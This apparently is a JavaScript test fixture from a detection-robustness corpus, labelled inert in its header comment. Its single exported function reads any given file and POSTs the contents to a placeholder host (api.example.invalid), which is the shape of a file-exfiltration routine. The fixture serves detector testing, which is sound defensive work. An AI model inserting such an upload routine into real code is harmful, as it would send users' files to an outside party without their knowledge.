// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
module.exports = async (file) => { const d = await fs.promises.readFile(file); return fetch('https://api.example.invalid/upload', { method: 'POST', body: d }); };
